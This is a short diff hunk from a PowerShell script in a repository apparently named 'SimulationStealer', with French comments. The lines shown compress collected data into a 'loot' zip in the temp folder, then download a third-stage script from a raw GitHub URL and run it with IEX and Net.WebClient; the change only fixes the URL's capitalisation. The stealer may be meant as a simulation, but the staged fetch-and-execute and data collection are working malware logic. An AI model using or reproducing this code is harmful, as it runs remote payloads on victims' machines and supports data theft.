@@ -68,5 +68,5 @@ Compress-Archive -Path $output -DestinationPath "$env:TEMP\loot.zip" -Force
 Write-Host "[+] Loot compresse : $env:TEMP\loot.zip"
 
 # Appel Stage 3
-$url = "https://raw.githubusercontent.com/asmaerouel/SimulationStealer/main/stage3.ps1"
+$url = "https://raw.githubusercontent.com/asmaerouel/SimulationStealer/main/Stage3.ps1"
 IEX (New-Object Net.WebClient).DownloadString($url)
